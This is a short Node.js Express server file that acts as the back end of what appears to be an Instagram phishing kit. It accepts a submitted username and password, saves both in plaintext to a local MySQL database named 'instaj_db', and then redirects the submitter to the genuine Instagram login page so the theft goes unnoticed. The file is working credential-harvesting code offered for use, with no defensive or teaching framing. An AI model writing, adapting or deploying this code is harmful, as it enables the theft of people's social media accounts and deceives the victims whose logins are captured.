const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql');

const app = express();
const PORT = 3000;

// Middleware to parse request body
app.use(bodyParser.urlencoded({ extended: true }));

// MySQL connection
const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root', // Default user for XAMPP
    password: '', // Default password is usually empty
    database: 'instaj_db' // Your database name
});

connection.connect((err) => {
    if (err) throw err;
    console.log('Connected to MySQL!');
});

// Endpoint to handle form submission
app.post('/submit', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Insert user into the database
    const query = 'INSERT INTO users (username, password) VALUES (?, ?)';
    connection.query(query, [username, password], (error, results) => {
        if (error) {
            console.error('Error inserting user:', error);
            return res.status(500).send('Error saving data');
        }

        // Redirect to Instagram login page
        res.redirect('https://www.instagram.com/accounts/login/');
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
